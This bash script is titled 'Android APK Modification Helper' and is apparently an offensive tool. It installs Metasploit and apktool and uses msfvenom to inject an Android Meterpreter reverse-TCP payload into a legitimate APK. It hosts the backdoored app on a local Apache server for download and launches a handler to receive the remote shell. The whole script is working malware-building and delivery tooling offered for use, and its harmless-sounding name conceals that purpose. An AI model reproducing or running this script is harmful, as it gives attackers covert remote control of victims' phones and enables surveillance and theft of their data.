#!/bin/bash
# Android APK Modification Helper
# Updated Script
clear
cat << "BANNER"

  _____  _____   ____   _______ ______  _____ _______ 
 |  __ \|  __ \ / __ \ /__   __|  ____|/ ____|__   __|
 | |__) | |__) | |  | |   | |  | |__  | |       | |   
 |  ___/|  _  /| |  | |   | |  |  __| | |       | |   
 | |    | | \ \| |__| |   | |  | |____| |____   | |   
 |_|    |_|  \_\\____/    |_|  |______|\\_____|  |_|   
                                                      
                    APK Modifier by Mental Demon
                             Version : 2.0

BANNER
sleep 2

echo "Checking For Root User...."
sleep 1
if [[ $(id -u) -ne 0 ]] ; then 
   echo "You are Not Root! Run as root" ; exit 1 ; 
else 
   echo "[+] Root access verified" ; 
fi

echo "[+] Installing required packages..."
pkgs=(metasploit-framework wget default-jdk aapt apksigner apache2 apktool)
for pkg in ${pkgs[@]}
do
    apt install -y $pkg 2>/dev/null
done

clear
read -p "Set Your LHOST: " lhost
read -p "Set Your LPORT: " lport
echo "APK Files Available:"
ls -lh *.apk
read -p "Write Clean APK Name: " capk
read -p "Write Output APK Name: " bapk
clear

echo "[+] Processing Your APK..."
msfvenom -x $capk -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport -o $bapk

echo "[+] Starting Apache2 Server..."
service apache2 start
cp $bapk /var/www/html/
echo "[+] Available at : http://$lhost/$bapk"
echo "[+] Process Completed!"

read -p "Start Metasploit Handler? (y/n): " start
if [[ $start == "y" ]]; then
    msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set lhost $lhost; set lport $lport; exploit;"
fi
